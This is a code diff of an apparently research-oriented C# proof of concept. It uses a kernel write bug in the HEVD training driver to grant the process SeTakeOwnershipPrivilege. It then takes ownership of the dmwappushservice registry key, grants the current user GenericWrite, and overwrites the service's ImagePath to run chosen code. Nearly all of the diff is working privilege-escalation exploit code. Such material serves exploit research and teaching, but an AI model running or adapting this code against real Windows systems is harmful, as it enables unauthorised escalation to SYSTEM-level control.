@@ -4,12 +4,54 @@ using System.IO;
 using System.Runtime.InteropServices;
 using System.Text;
 
-namespace RestoreServiceModificationVariant
+namespace TakeOwnershipServiceModificationVariant
 {
-    class RestoreServiceModificationVariant
+    internal class TakeOwnershipServiceModificationVariant
     {
-        // Windows Definition
-        // Windows Enum
+        /*
+         * P/Invoke : Enums
+         */
+        [Flags]
+        enum ACCESS_MASK : uint
+        {
+            DELETE = 0x00010000,
+            READ_CONTROL = 0x00020000,
+            WRITE_DAC = 0x00040000,
+            WRITE_OWNER = 0x00080000,
+            SYNCHRONIZE = 0x00100000,
+            STANDARD_RIGHTS_REQUIRED = 0x000F0000,
+            STANDARD_RIGHTS_READ = 0x00020000,
+            STANDARD_RIGHTS_WRITE = 0x00020000,
+            STANDARD_RIGHTS_EXECUTE = 0x00020000,
+            STANDARD_RIGHTS_ALL = 0x001F0000,
+            SPECIFIC_RIGHTS_ALL = 0x0000FFFF,
+            ACCESS_SYSTEM_SECURITY = 0x01000000,
+            MAXIMUM_ALLOWED = 0x02000000,
+            GENERIC_READ = 0x80000000,
+            GENERIC_WRITE = 0x40000000,
+            GENERIC_EXECUTE = 0x20000000,
+            GENERIC_ALL = 0x10000000,
+            DESKTOP_READOBJECTS = 0x00000001,
+            DESKTOP_CREATEWINDOW = 0x00000002,
+            DESKTOP_CREATEMENU = 0x00000004,
+            DESKTOP_HOOKCONTROL = 0x00000008,
+            DESKTOP_JOURNALRECORD = 0x00000010,
+            DESKTOP_JOURNALPLAYBACK = 0x00000020,
+            DESKTOP_ENUMERATE = 0x00000040,
+            DESKTOP_WRITEOBJECTS = 0x00000080,
+            DESKTOP_SWITCHDESKTOP = 0x00000100,
+            WINSTA_ENUMDESKTOPS = 0x00000001,
+            WINSTA_READATTRIBUTES = 0x00000002,
+            WINSTA_ACCESSCLIPBOARD = 0x00000004,
+            WINSTA_CREATEDESKTOP = 0x00000008,
+            WINSTA_WRITEATTRIBUTES = 0x00000010,
+            WINSTA_ACCESSGLOBALATOMS = 0x00000020,
+            WINSTA_EXITWINDOWS = 0x00000040,
+            WINSTA_ENUMERATE = 0x00000100,
+            WINSTA_READSCREEN = 0x00000200,
+            WINSTA_ALL_ACCESS = 0x0000037F
+        }
+
         [Flags]
         enum FormatMessageFlags : uint
         {
@@ -39,6 +81,37 @@ namespace RestoreServiceModificationVariant
             REG_QWORD_LITTLE_ENDIAN = 11
         }
 
+        enum SE_OBJECT_TYPE
+        {
+            SE_UNKNOWN_OBJECT_TYPE,
+            SE_FILE_OBJECT,
+            SE_SERVICE,
+            SE_PRINTER,
+            SE_REGISTRY_KEY,
+            SE_LMSHARE,
+            SE_KERNEL_OBJECT,
+            SE_WINDOW_OBJECT,
+            SE_DS_OBJECT,
+            SE_DS_OBJECT_ALL,
+            SE_PROVIDER_DEFINED_OBJECT,
+            SE_WMIGUID_OBJECT,
+            SE_REGISTRY_WOW64_32KEY,
+            SE_REGISTRY_WOW64_64KEY
+        }
+
+        [Flags]
+        enum SECURITY_INFORMATION : uint
+        {
+            OWNER_SECURITY_INFORMATION = 0x00000001,
+            GROUP_SECURITY_INFORMATION = 0x00000002,
+            DACL_SECURITY_INFORMATION = 0x00000004,
+            SACL_SECURITY_INFORMATION = 0x00000008,
+            UNPROTECTED_SACL_SECURITY_INFORMATION = 0x10000000,
+            UNPROTECTED_DACL_SECURITY_INFORMATION = 0x20000000,
+            PROTECTED_SACL_SECURITY_INFORMATION = 0x40000000,
+            PROTECTED_DACL_SECURITY_INFORMATION = 0x80000000
+        }
+
         enum SERVICE_STATE
         {
             SERVICE_STOPPED = 1,
@@ -48,6 +121,21 @@ namespace RestoreServiceModificationVariant
             SERVICE_CONTINUE_PENDING,
             SERVICE_PAUSE_PENDING,
             SERVICE_PAUSED
+        }
+
+        enum SID_NAME_USE
+        {
+            SidTypeUser = 1,
+            SidTypeGroup,
+            SidTypeDomain,
+            SidTypeAlias,
+            SidTypeWellKnownGroup,
+            SidTypeDeletedAccount,
+            SidTypeInvalid,
+            SidTypeUnknown,
+            SidTypeComputer,
+            SidTypeLabel,
+            SidTypeLogonSession
         }
 
         enum SYSTEM_INFORMATION_CLASS
@@ -284,7 +372,35 @@ namespace RestoreServiceModificationVariant
             MAXIMUM_ALLOWED = 0x02000000
         }
 
-        // Windows Struct
+        /*
+         * P/Invoke : Structs
+         */
+        [StructLayout(LayoutKind.Sequential)]
+        struct ACCESS_ALLOWED_ACE
+        {
+            public ACE_HEADER Header;
+            public int Mask;
+            public int SidStart;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        struct ACE_HEADER
+        {
+            public byte AceType;
+            public byte AceFlags;
+            public short AceSize;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        struct ACL
+        {
+            public byte AclRevision;
+            public byte Sbz1;
+            public short AclSize;
+            public short AceCount;
+            public short Sbz2;
+        }
+
         [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
         struct SERVICE_STATUS_PROCESS
         {
@@ -313,12 +429,77 @@ namespace RestoreServiceModificationVariant
         }
 
 
-        // Windows API
+        /*
+         * P/Invoke : Win32 APIs
+         */
         /*
          * advapi32.dll
          */
         [DllImport("advapi32.dll", SetLastError = true)]
+        static extern bool AddAccessAllowedAce(
+            IntPtr pAcl,
+            int dwAceRevision,
+            ACCESS_MASK AccessMask,
+            IntPtr pSid);
+
+        [DllImport("advapi32.dll", SetLastError = true)]
         static extern bool CloseServiceHandle(IntPtr hService);
+
+        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+        static extern bool ConvertSidToStringSid(
+            IntPtr /* PSID */ Sid,
+            out string StringSid);
+
+        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+        static extern int GetNamedSecurityInfo(
+            string pObjectName,
+            SE_OBJECT_TYPE ObjectType,
+            SECURITY_INFORMATION SecurityInfo,
+            out IntPtr /* PSID* */ ppsidOwner,
+            out IntPtr /* PSID* */ ppsidGroup,
+            out IntPtr /* PACL* */ ppDacl,
+            out IntPtr /* PACL* */ ppSacl,
+            out IntPtr /* PSECURITY_DESCRIPTOR* */ ppSecurityDescriptor);
+
+        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+        static extern int GetNamedSecurityInfo(
+            string pObjectName,
+            SE_OBJECT_TYPE ObjectType,
+            SECURITY_INFORMATION SecurityInfo,
+            out IntPtr /* PSID* */ ppsidOwner,
+            IntPtr ppsidGroup,
+            IntPtr ppDacl,
+            IntPtr ppSacl,
+            IntPtr ppSecurityDescriptor);
+
+        [DllImport("advapi32.dll", SetLastError = true)]
+        static extern bool InitializeAcl(
+            IntPtr pAcl,
+            int nAclLength,
+            int dwAclRevision);
+
+        [DllImport("advapi32.dll", SetLastError = true)]
+        static extern bool IsValidSid(IntPtr /* PSID */ pSid);
+
+        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+        static extern bool LookupAccountName(
+            string lpSystemName,
+            string lpAccountName,
+            IntPtr /* PSID */ Sid,
+            ref int cbSid,
+            StringBuilder ReferencedDomainName,
+            ref int cchReferencedDomainName,
+            out SID_NAME_USE peUse);
+
+        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+        static extern bool LookupAccountSid(
+            string lpSystemName,
+            IntPtr /* PSID */ Sid,
+            StringBuilder Name,
+            ref int cchName,
+            StringBuilder ReferencedDomainName,
+            ref int cchReferencedDomainName,
+            out SID_NAME_USE peUse);
 
         [DllImport("advapi32.dll", SetLastError = true)]
         static extern bool OpenProcessToken(
@@ -376,6 +557,16 @@ namespace RestoreServiceModificationVariant
             IntPtr lpData,
             int cbData);
 
+        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+        static extern int SetNamedSecurityInfo(
+            string pObjectName,
+            SE_OBJECT_TYPE ObjectType,
+            SECURITY_INFORMATION SecurityInfo,
+            IntPtr /* PSID */ psidOwner,
+            IntPtr /* PSID */ psidGroup,
+            IntPtr /* PACL */ pDacl,
+            IntPtr /* PACL */ pSacl);
+
         [DllImport("advapi32.dll", SetLastError = true)]
         static extern bool StartService(
             IntPtr hService,
@@ -429,7 +620,9 @@ namespace RestoreServiceModificationVariant
             int SystemInformationLength,
             ref int ReturnLength);
 
-        // Windows Consts
+        /*
+         * Windows Consts
+         */
         const int STATUS_SUCCESS = 0;
         static readonly int STATUS_INFO_LENGTH_MISMATCH = Convert.ToInt32("0xC0000004", 16);
         static readonly IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);
@@ -438,13 +631,15 @@ namespace RestoreServiceModificationVariant
         const int ERROR_MORE_DATA = 234;
         const int ERROR_SERVICE_REQUEST_TIMEOUT = 1053;
         static readonly UIntPtr HKEY_LOCAL_MACHINE = new UIntPtr(0x80000002u);
-        const uint REG_OPTION_BACKUP_RESTORE = 0x00000004;
+        const uint REG_OPTION_NON_VOLATILE = 0x00000000;
         const uint KEY_SET_VALUE = 0x0002;
         const uint KEY_QUERY_VALUE = 0x0001;
         const uint SERVICE_QUERY_STATUS = 0x00004;
         const uint SERVICE_START = 0x10;
         const uint SC_MANAGER_CONNECT = 0x0001;
         const int SC_STATUS_PROCESS_INFO = 0;
+        const int ACL_REVISION = 2;
+        const int SECURITY_MAX_SID_SIZE = 68;
 
 
         // User define Consts
@@ -553,6 +748,196 @@ namespace RestoreServiceModificationVariant
             Marshal.FreeHGlobal(buffer);
 
             return (SERVICE_STATE)ssp.dwCurrentState;
+        }
+
+
+        static bool ConvertAccountNameToSid(
+            ref string accountName,
+            out IntPtr pSid,
+            out SID_NAME_USE peUse)
+        {
+            int error;
+            bool status;
+            int cbSid = 8;
+            int cchReferencedDomainName = 256;
+            var domain = new StringBuilder(cchReferencedDomainName);
+
+            do
+            {
+                pSid = Marshal.AllocHGlobal(cbSid);
+
+                status = LookupAccountName(
+                    null,
+                    accountName,
+                    pSid,
+                    ref cbSid,
+                    domain,
+                    ref cchReferencedDomainName,
+                    out peUse);
+                error = Marshal.GetLastWin32Error();
+
+                if (!status)
+                {
+                    domain.Clear();
+                    domain = new StringBuilder(cchReferencedDomainName);
+                    Marshal.FreeHGlobal(pSid);
+                }
+            } while (error == ERROR_INSUFFICIENT_BUFFER && !status);
+
+            if (!status)
+            {
+                pSid = IntPtr.Zero;
+                Console.WriteLine("[-] Failed to resolve account name to SID.");
+                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));
+
+                return false;
+            }
+
+            ConvertSidToAccountName(pSid, out accountName, out peUse);
+
+            return true;
+        }
+
+
+        static bool ConvertSidToAccountName(
+            IntPtr pSid,
+            out string accountName,
+            out SID_NAME_USE peUse)
+        {
+            int error;
+            int cchName = 256;
+            int cchReferencedDomainName = 256;
+            var name = new StringBuilder(cchName);
+            var domain = new StringBuilder(cchReferencedDomainName);
+
+            if (!LookupAccountSid(
+                null,
+                pSid,
+                name,
+                ref cchName,
+                domain,
+                ref cchReferencedDomainName,
+                out peUse))
+            {
+                error = Marshal.GetLastWin32Error();
+                accountName = null;
+                Console.WriteLine("[-] Failed to resolve SID to account name.");
+                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));
+
+                return false;
+            }
+
+
+            if (string.IsNullOrEmpty(name.ToString()) &&
+                string.IsNullOrEmpty(domain.ToString()))
+            {
+                Console.WriteLine("[-] Failed to resolve SID to account name.");
+                accountName = null;
+
+                return false;
+            }
+
+
+            if (string.IsNullOrEmpty(name.ToString()))
+            {
+                accountName = domain.ToString();
+            }
+            else if (string.IsNullOrEmpty(domain.ToString()))
+            {
+                accountName = name.ToString();
+            }
+            else
+            {
+                accountName = string.Format(@"{0}\{1}", domain.ToString(), name.ToString());
+            }
+
+            return true;
+        }
+
+
+        static void DumpOwnerSidInformation(IntPtr pOwnerSid)
+        {
+            if (!ConvertSidToAccountName(
+                    pOwnerSid,
+                    out string accountName,
+                    out SID_NAME_USE accountType))
+            {
+                return;
+            }
+
+            ConvertSidToStringSid(pOwnerSid, out string accountSidString);
+
+            Console.WriteLine("[*] Current Owner Information:");
+            Console.WriteLine("    |-> Name : {0}", accountName);
+            Console.WriteLine("    |-> SID  : {0}", accountSidString);
+            Console.WriteLine("    |-> Type : {0}", accountType);
+        }
+
+
+        static IntPtr GetGenericWriteDacl(IntPtr pSid)
+        {
+            bool status;
+            int cbSid = SECURITY_MAX_SID_SIZE;
+            int cbDacl;
+            IntPtr pDacl;
+
+            if (!IsValidSid(pSid))
+                return IntPtr.Zero;
+
+            do
+            {
+                cbDacl = Marshal.SizeOf(typeof(ACL)) +
+                    Marshal.SizeOf(typeof(ACCESS_ALLOWED_ACE)) -
+                    Marshal.SizeOf(typeof(int)) +
+                    cbSid;
+                pDacl = Marshal.AllocHGlobal(cbDacl);
+                status = InitializeAcl(pDacl, cbDacl, ACL_REVISION);
+
+                if (!status)
+                    break;
+
+                status = AddAccessAllowedAce(
+                    pDacl,
+                    ACL_REVISION,
+                    ACCESS_MASK.GENERIC_WRITE,
+                    pSid);
+            } while (false);
+
+            if (!status)
+            {
+                if (pDacl != IntPtr.Zero)
+                    Marshal.FreeHGlobal(pDacl);
+
+                return IntPtr.Zero;
+            }
+
+            return pDacl;
+        }
+
+
+        static IntPtr GetOwnerInformation(string path, SE_OBJECT_TYPE objectType)
+        {
+            int error;
+
+            error = GetNamedSecurityInfo(
+                path,
+                objectType,
+                SECURITY_INFORMATION.OWNER_SECURITY_INFORMATION,
+                out IntPtr pSidOwner,
+                IntPtr.Zero,
+                IntPtr.Zero,
+                IntPtr.Zero,
+                IntPtr.Zero);
+
+            if (error != ERROR_SUCCESS)
+            {
+                Console.WriteLine("[-] Failed to get owner information.");
+                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));
+
+                return IntPtr.Zero;
+            }
+
+            return pSidOwner;
         }
 
 
@@ -893,7 +1278,7 @@ namespace RestoreServiceModificationVariant
         }
 
 
-        static bool WriteRegKeyValueWithRestorePrivilege(
+        static bool OverwriteRegKeyValue(
             UIntPtr hKey,
             string subKey,
             string value,
@@ -908,7 +1293,7 @@ namespace RestoreServiceModificationVariant
                 subKey,
                 IntPtr.Zero,
                 IntPtr.Zero,
-                REG_OPTION_BACKUP_RESTORE,
+                REG_OPTION_NON_VOLATILE,
                 KEY_SET_VALUE,
                 IntPtr.Zero,
                 out IntPtr phkResult,
@@ -944,6 +1329,66 @@ namespace RestoreServiceModificationVariant
         }
 
 
+        static bool SetDaclInformation(
+            string path,
+            SE_OBJECT_TYPE objectType,
+            IntPtr pDacl)
+        {
+            int error;
+
+            error = SetNamedSecurityInfo(
+                path,
+                objectType,
+                SECURITY_INFORMATION.DACL_SECURITY_INFORMATION,
+                IntPtr.Zero,
+                IntPtr.Zero,
+                pDacl,
+                IntPtr.Zero);
+
+            if (error != ERROR_SUCCESS)
+            {
+                Console.WriteLine("[-] Failed to set DACL information.");
+                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));
+
+                return false;
+            }
+            else
+            {
+                return true;
+            }
+        }
+
+
+        static bool SetOwnerInformation(
+            string path,
+            SE_OBJECT_TYPE objectType,
+            IntPtr pSidOwner)
+        {
+            int error;
+
+            error = SetNamedSecurityInfo(
+                path,
+                objectType,
+                SECURITY_INFORMATION.OWNER_SECURITY_INFORMATION,
+                pSidOwner,
+                IntPtr.Zero,
+                IntPtr.Zero,
+                IntPtr.Zero);
+
+            if (error != ERROR_SUCCESS)
+            {
+                Console.WriteLine("[-] Failed to set owner information.");
+                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));
+
+                return false;
+            }
+            else
+            {
+                return true;
+            }
+        }
+
+
         static void ZeroMemory(IntPtr buffer, int size)
         {
             var nullBytes = new byte[size];
@@ -963,6 +1408,11 @@ namespace RestoreServiceModificationVariant
             }
 
             bool status;
+            string accountName = Environment.UserName;
+            IntPtr pGenericWriteDacl;
+            IntPtr pInitialOwnerSid;
+            var objectType = SE_OBJECT_TYPE.SE_REGISTRY_KEY;
+            string registryPath = @"MACHINE\SYSTEM\CurrentControlSet\Services\dmwappushservice";
             string serviceName = "dmwappushservice";
             string subKey = string.Format(
                 "SYSTEM\\CurrentControlSet\\Services\\{0}",
@@ -978,7 +1428,7 @@ namespace RestoreServiceModificationVariant
             ZeroMemory(data, sizeData);
             Marshal.Copy(dataBytes, 0, data, sizeData);
 
-            Console.WriteLine("--[ HEVD Kernel Write PoC : SeRestorePrivilege - Service Modification\n");
+            Console.WriteLine("--[ HEVD Kernel Write PoC : SeTakeOwnershipPrivilege - Service Modification\n");
 
             if (!Environment.Is64BitOperatingSystem)
             {
@@ -1012,7 +1462,7 @@ namespace RestoreServiceModificationVariant
                 return;
             }
 
-            var privs = (ulong)SepTokenPrivilegesFlags.RESTORE;
+            var privs = (ulong)SepTokenPrivilegesFlags.TAKE_OWNERSHIP;
 
             OverwriteTokenPrivileges(hDevice, tokenPointer, privs);
             CloseHandle(hDevice);
@@ -1026,6 +1476,71 @@ namespace RestoreServiceModificationVariant
                 Console.WriteLine("[*] If you want to try this exploit soon, stop {0} with administrative privilege.\n", serviceName);
 
                 return;
+            }
+
+            Console.WriteLine("[>] Trying to get caller account name and SID.");
+
+            if (!ConvertAccountNameToSid(
+                ref accountName,
+                out IntPtr pAccountSid,
+                out SID_NAME_USE peUserUse))
+            {
+                return;
+            }
+            else
+            {
+                ConvertSidToStringSid(pAccountSid, out string accountSidString);
+                Console.WriteLine("[+] Got current account name and SID.");
+                Console.WriteLine("[*] Current Account Information:");
+                Console.WriteLine("    |-> Name : {0}", accountName);
+                Console.WriteLine("    |-> SID  : {0}", accountSidString);
+                Console.WriteLine("    |-> Type : {0}", peUserUse);
+            }
+
+            Console.WriteLine("[>] Trying to get current owner information.");
+
+            pInitialOwnerSid = GetOwnerInformation(registryPath, objectType);
+
+            if (pInitialOwnerSid == IntPtr.Zero)
+                return;
+
+            DumpOwnerSidInformation(pInitialOwnerSid);
+
+            Console.WriteLine("[>] Trying to change owner to \"{0}\".", accountName);
+
+            if (!SetOwnerInformation(
+                registryPath,
+                objectType,
+                pAccountSid))
+            {
+                return;
+            }
+            else
+            {
+                Console.WriteLine("[+] Owner is changed successfully.");
+            }
+
+            Console.WriteLine("[>] Trying to add GenericWrite DACL for the current user.");
+
+            pGenericWriteDacl = GetGenericWriteDacl(pAccountSid);
+
+            if (pGenericWriteDacl == IntPtr.Zero)
+            {
+                Console.WriteLine("[-] Failed to generate GenericWrite DACL for the current user.");
+
+                return;
+            }
+
+            if (!SetDaclInformation(
+                registryPath,
+                objectType,
+                pGenericWriteDacl))
+            {
+                Console.WriteLine("[-] Failed to add GenericWrite DACL.");
+            }
+            else
+            {
+                Console.WriteLine("[+] GenericWrite DACL is added successfully.");
             }
 
             if (!ReadRegKeyValue(
@@ -1045,7 +1560,7 @@ namespace RestoreServiceModificationVariant
             Console.WriteLine("    |-> Initial ImagePath   : {0}", revert);
             Console.WriteLine("    |-> ImagePath to Modify : {0}", modify);
 
-            status = WriteRegKeyValueWithRestorePrivilege(
+            status = OverwriteRegKeyValue(
                 HKEY_LOCAL_MACHINE,
                 subKey,
                 value,
@@ -1076,7 +1591,7 @@ namespace RestoreServiceModificationVariant
 
             Console.WriteLine("[>] Reverting ImagePath for {0} service.", serviceName);
 
-            status = WriteRegKeyValueWithRestorePrivilege(
+            status = OverwriteRegKeyValue(
                 HKEY_LOCAL_MACHINE,
                 subKey,
                 value,
